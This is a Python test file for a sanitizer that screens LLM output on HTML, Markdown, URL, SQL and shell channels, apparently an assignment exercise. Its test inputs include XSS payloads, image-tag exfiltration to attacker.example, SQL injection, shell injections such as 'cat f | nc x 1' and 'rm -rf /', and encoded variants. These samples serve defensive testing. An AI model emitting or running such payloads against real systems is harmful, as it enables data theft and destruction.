"""Plain-assert tests for GA7 Q4 (LLM Output Handling Gate).

Run:  python ga7/app/test_q4.py
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from q4_sanitize import handle  # noqa: E402

CDN = "cdn-ei9b81i.example"
APP = "app-684ukej.example"

CHECKS = 0


def check(channel, output, expected):
    global CHECKS
    got = handle({"channel": channel, "output": output})
    assert got["reason"] == expected, (
        "channel=%r output=%r -> %r, expected %r" % (channel, output, got["reason"], expected)
    )
    assert got["safe"] is (expected == "SAFE"), "safe flag out of sync with reason %r" % expected
    assert set(got) == {"safe", "reason"}, "unexpected response keys: %r" % sorted(got)
    CHECKS += 1


def check_body(body, expected):
    global CHECKS
    got = handle(body)
    assert got["reason"] == expected, "body=%r -> %r, expected %r" % (body, got["reason"], expected)
    assert got["safe"] is (expected == "SAFE")
    CHECKS += 1


# --- benign output on every channel ----------------------------------------

check("html", "<p>Hello <b>world</b></p>", "SAFE")
check("html", '<img src="https://%s/logo.png" alt="logo">' % CDN, "SAFE")
check("html", '<a href="https://%s/docs">docs</a>' % APP, "SAFE")
check("html", '<a href="/local/page">local</a>', "SAFE")
check("html", "<p>Her son= the tallest, and the button= is blue.</p>", "SAFE")
check("markdown", "[docs](https://%s/a)" % CDN, "SAFE")
check("markdown", "[home](/local/page)", "SAFE")
check("markdown", '[docs](https://%s/a "Title here")' % CDN, "SAFE")
check("markdown", "Plain **bold** text with no links at all.", "SAFE")
check("url", "https://%s/x" % APP, "SAFE")
check("url", "/relative/path", "SAFE")
check("url", "  https://%s/x  " % CDN, "SAFE")
check("sql", "SELECT name FROM users WHERE id = 5", "SAFE")
check("shell", "ls -la /tmp", "SAFE")

# --- html: script-ish tags --------------------------------------------------

check("html", "<script>alert(1)</script>", "SCRIPT_TAG")
check("html", "< SCRIPT >alert(1)</script>", "SCRIPT_TAG")
check("html", '<iframe src="https://%s/x"></iframe>' % CDN, "SCRIPT_TAG")
check("html", '<object data="x.swf"></object>', "SCRIPT_TAG")
check("html", '<embed src="/x">', "SCRIPT_TAG")
# SCRIPT_TAG wins over the later html rules.
check("html", '<script src="https://attacker.example/x.js"></script>', "SCRIPT_TAG")

# --- html: event handlers ---------------------------------------------------

check("html", '<img src="/x" onerror="a()">', "EVENT_HANDLER")
check("html", '<body onload="go()">', "EVENT_HANDLER")
check("html", "<div onclick=go()>x</div>", "EVENT_HANDLER")
check("html", '<div ONMOUSEOVER = "go()">x</div>', "EVENT_HANDLER")
check("html", '<img src="/x"/onerror=a()>', "EVENT_HANDLER")
# EVENT_HANDLER wins over the URL rules that come after it.
check("html", '<img src="https://attacker.example/x" onerror="a()">', "EVENT_HANDLER")

# --- dangerous schemes ------------------------------------------------------

for ch in ("html", "markdown", "url"):
    check(ch, "javascript:alert(1)", "DANGEROUS_SCHEME")
    check(ch, "javascript :alert(1)", "DANGEROUS_SCHEME")
    check(ch, "DATA:text/html,x", "DANGEROUS_SCHEME")
    check(ch, "vbscript:x", "DANGEROUS_SCHEME")

check("html", '<a href="javascript:alert(1)">x</a>', "DANGEROUS_SCHEME")
check("markdown", "[x](javascript:alert(1))", "DANGEROUS_SCHEME")
check("url", "ftp://%s/x" % CDN, "DANGEROUS_SCHEME")
check("url", "file:///etc/passwd", "DANGEROUS_SCHEME")
# DANGEROUS_SCHEME is checked before EXTERNAL_EXFIL.
check("url", "ftp://attacker.example/x", "DANGEROUS_SCHEME")

# --- external exfiltration --------------------------------------------------

check("url", "https://attacker.example/x", "EXTERNAL_EXFIL")
check("url", "https://sub.%s/x" % CDN, "EXTERNAL_EXFIL")        # subdomain not allowed
check("url", "https://%s.evil.com/" % CDN, "EXTERNAL_EXFIL")     # suffix trick
check("url", "https://%s@attacker.example/" % CDN, "EXTERNAL_EXFIL")  # credentials trick
check("url", "https://attacker.example/?next=https://%s/" % CDN, "EXTERNAL_EXFIL")  # query trick
check("url", "//attacker.example/p", "EXTERNAL_EXFIL")           # protocol-relative
check("url", "//%s/p" % CDN, "SAFE")
check("url", "https://%s./x" % CDN, "SAFE")                      # trailing dot stripped
check("url", "https://%s/x" % CDN.upper(), "SAFE")               # host compare is case-insensitive
check("html", '<img src="https://attacker.example/log?d=secret">', "EXTERNAL_EXFIL")
check("html", "<a href='https://attacker.example/x'>x</a>", "EXTERNAL_EXFIL")
check("markdown", "![x](https://attacker.example/log?d=secret)", "EXTERNAL_EXFIL")
check("markdown", '[x](https://attacker.example/a "title")', "EXTERNAL_EXFIL")
check("markdown", "[ok](https://%s/a) and [bad](https://attacker.example/b)" % CDN, "EXTERNAL_EXFIL")
check("markdown", "[x](<https://attacker.example/a>)", "EXTERNAL_EXFIL")
check("html", "<img src=https://attacker.example/x>", "EXTERNAL_EXFIL")
check("html", "<img src=/local/x.png>", "SAFE")

# --- sql --------------------------------------------------------------------

check("sql", "'; DROP TABLE users; --", "SQL_METACHAR")
check("sql", "SELECT 1 UNION SELECT 2", "SQL_METACHAR")
check("sql", "WHERE a=1 or 1=1", "SQL_METACHAR")
check("sql", 'SELECT "x" FROM t', "SQL_METACHAR")
check("sql", "SELECT 1 /* comment */", "SQL_METACHAR")
check("sql", "SELECT 1 -- trailing", "SQL_METACHAR")
# \bunion\b judgement call: these words must NOT trip the rule.
check("sql", "SELECT id FROM reunion_events", "SAFE")
check("sql", "SELECT id FROM unionized_staff", "SAFE")

# --- shell ------------------------------------------------------------------

check("shell", "cat f | nc x 1", "SHELL_METACHAR")
check("shell", "echo $(whoami)", "SHELL_METACHAR")
check("shell", "echo ${HOME}", "SHELL_METACHAR")
check("shell", "ls; rm -rf /", "SHELL_METACHAR")
check("shell", "sleep 5 & ", "SHELL_METACHAR")
check("shell", "cat < /etc/passwd", "SHELL_METACHAR")
check("shell", "echo hi > /tmp/x", "SHELL_METACHAR")
check("shell", "echo `id`", "SHELL_METACHAR")

# --- encoded payloads -------------------------------------------------------

check("html", "%3Cscript%3Ealert(1)%3C/script%3E", "ENCODED_PAYLOAD")
check("html", "&lt;script&gt;alert(1)&lt;/script&gt;", "ENCODED_PAYLOAD")
check("html", "\\u003cscript\\u003e", "ENCODED_PAYLOAD")
check("html", "&#60;script&#62;", "ENCODED_PAYLOAD")
check("html", "&#x3c;script&#x3e;", "ENCODED_PAYLOAD")
check("url", "%6Aavascript:alert(1)", "ENCODED_PAYLOAD")
check("sql", "%27%3B%20DROP%20TABLE%20users", "ENCODED_PAYLOAD")
check("shell", "echo %24%28whoami%29", "ENCODED_PAYLOAD")
check("markdown", "[x](https%3A%2F%2Fattacker.example%2Fa)", "ENCODED_PAYLOAD")
# Encoded but benign -> falls through to the original, which is SAFE.
check("markdown", "hello%20world", "SAFE")
check("html", "<p>Tom &amp; Jerry</p>", "SAFE")
check("markdown", "[docs](https://%s/a%%20b)" % CDN, "SAFE")

# --- invalid schema ---------------------------------------------------------

check_body(["not", "a", "dict"], "INVALID_SCHEMA")
check_body("nope", "INVALID_SCHEMA")
check_body(None, "INVALID_SCHEMA")
check_body({"channel": "xml", "output": "x"}, "INVALID_SCHEMA")
check_body({"channel": "HTML", "output": "x"}, "INVALID_SCHEMA")
check_body({"channel": 5, "output": "x"}, "INVALID_SCHEMA")
check_body({"output": "x"}, "INVALID_SCHEMA")
check_body({"channel": "html"}, "INVALID_SCHEMA")
check_body({"channel": "html", "output": 123}, "INVALID_SCHEMA")
check_body({"channel": "html", "output": None}, "INVALID_SCHEMA")
check_body({"channel": "html", "output": ["x"]}, "INVALID_SCHEMA")
check_body({"channel": "html", "output": "a" * 20001}, "INVALID_SCHEMA")
# Exactly at the limit is fine.
check_body({"channel": "html", "output": "a" * 20000}, "SAFE")
# Extra keys are ignored.
check_body({"channel": "shell", "output": "ls -la", "extra": 1}, "SAFE")

print("all %d checks passed" % CHECKS)
